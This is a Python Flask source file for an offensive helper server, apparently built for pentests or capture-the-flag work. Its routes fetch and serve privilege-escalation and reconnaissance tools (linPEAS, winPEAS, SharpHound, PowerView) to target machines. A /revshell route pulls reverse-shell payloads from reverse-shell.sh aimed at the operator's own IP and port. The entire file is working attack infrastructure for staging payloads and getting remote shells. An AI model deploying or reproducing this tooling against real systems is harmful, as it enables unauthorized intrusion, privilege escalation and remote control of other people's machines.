#!/usr/bin/env python3
from flask import Flask, request
import requests
from netifaces import interfaces, ifaddresses, AF_INET
import sys

# TODO:
# Criar um README.MD
# Criar um --help explicando cada rota
# Criar um arquiho de config (.bing_config)
# Eu acho q a rota de baixar arquivo estatico n ta funcionando direito, tenho q resolver isso

app = Flask(__name__, static_folder='', static_url_path='')
net_interfaces = interfaces()

def get_interface():
  return request.headers.get('Host').split(':')[0]

def get_linpeas():
    url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
    r = requests.get(url)
    return r.text

def get_rev_shell(ip,port):
    url = f'https://reverse-shell.sh/{ip}:{port}'
    r = requests.get(url)
    return r.text

@app.route('/winpeas')
def get_winpeas():
    url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat'
    r = requests.get(url)
    return r.text

@app.route('/<path:path>')
def static_file(path):
    return app.send_static_file(path)

@app.route('/linpeas')
def linpeas():
    return get_linpeas()

@app.route('/sharphound')
def sharphound():
    url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
    r = requests.get(url)
    return r.text

@app.route('/powerview')
def powerview():
    url = "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"
    r = requests.get(url)
    return r.text

@app.route("/revshell", defaults={"port": "4444"})
@app.route('/revshell/<port>')
def revshell(port):
    ip = get_interface()
    return get_rev_shell(ip,port)


if __name__ == '__main__':
    print('Endpoints: /linpeas, /winpeas, /revshell and /revshell/<port>')
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    try:
      interface = next(filter(lambda x: x in net_interfaces, ['tun0', 'eth0', 'wlan0']))
      print(f"Your ip is: {ifaddresses(interface)[2][0]['addr']}")
    except StopIteration:
      print('We couldn\'t find your net interface :(')
    if len(sys.argv) > 1 and int(sys.argv[1]) < 65535 and int(sys.argv[1]) >= 1:
      try:
        app.run(host='0.0.0.0', port=sys.argv[1])
      except ValueError:
        print('You can only use numbers as ports.')

    else:
      app.run(host='0.0.0.0', port=8000)